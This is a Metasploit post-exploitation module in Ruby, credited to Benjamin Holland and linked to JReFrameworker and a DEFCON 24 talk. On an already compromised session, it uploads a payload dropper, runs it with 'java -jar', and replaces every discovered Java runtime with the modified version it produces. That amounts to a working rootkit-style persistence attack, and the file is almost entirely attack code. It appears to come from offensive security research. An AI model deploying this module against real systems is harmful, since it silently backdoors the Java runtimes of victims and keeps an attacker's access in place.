##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Payloads must be generated by JReFrameworker: https://ben-holland.com/JReFrameworker/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  
  include Msf::Post::File

  Rank = ExcellentRanking

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Modify JVM Runtime',
      'Description'   => %q{ This module executes a JReFrameworker payload dropper },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Benjamin Holland (daedared)' ],
      'Platform'      => [ 'win', 'osx', 'linux' ],
      'References'    => 
       [
         [ 'JReFrameworker', 'https://ben-holland.com/JReFrameworker/' ],
         [ 'DEFCON24', 'https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Holland' ]
       ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))
    register_options(
      [
        OptPath.new('PAYLOAD_DROPPER', [true, 'The JReFrameworker payload to execute'])
      ], self.class)
  end

  def upload_file(tempdir, file)
    remote_file = "#{tempdir}#{File.basename(file)}"
    print_status("#{peer} - Uploading #{remote_file}...")
    write_file(remote_file, File.binread(file))
    print_status("#{peer} - Uploaded #{remote_file}")
    remote_file
  end

  def get_platform()
    if session.type =~ /meterpreter/ && session.sys.config.sysinfo['OS'] =~ /darwin/i
      platform = 'osx'
    else
      platform = session.platform
    end
    platform
  end

  def get_temporary_directory(platform)
    if platform.include? "/win"
      #return "%TEMP%\\" # not working :\
      return "C:\\"
    else
      return "/tmp/"
    end
  end
  
  def run
    dropper_local = datastore['PAYLOAD_DROPPER']
    platform = get_platform()
    tempdir = get_temporary_directory(platform)
    dropper_remote = upload_file(tempdir, dropper_local)

    print_status("ReFrameworking JVMs on #{session.inspect}...")
    
    # todo: handle specified runtime search directories

    # rework each discovered runtime
    modification_results = cmd_exec("java -jar #{dropper_remote}")

    print_status(modification_results)

    # parse the results, results are a list of original and corresponding modified runtimes
    modification_results = "#{modification_results}".strip!
    modifications = modification_results.split("\n")

    # iterate over each original,modified runtime pair
    # and replace the original runtime with the modified runtime
    index = 0
    while index < modifications.size
      original = ''
      modified = ''

      while original == '' && index < modifications.size
        if not (modifications[index]).nil?
          if modifications[index].include? 'Original Runtime: '
            original = modifications[index]
            original = original.gsub! 'Original Runtime: ', ''
            original.strip!
          end
        end
        index = index + 1
      end

      while modified == '' && index < modifications.size
        if not (modifications[index]).nil?
          if modifications[index].include? 'Modified Runtime: '
            modified = modifications[index]
            modified = modified.gsub! 'Modified Runtime: ', ''
            modified.strip!
          end
        end
        index = index + 1
      end

      if original != '' && modified != ''
        print_status("Created temporary runtime #{modified}")
        print_status("Overwriting #{original}...")
        rm_f(original)
        rename_file(modified, original)
        original = ''
        modified = ''
      end

    end

  end

end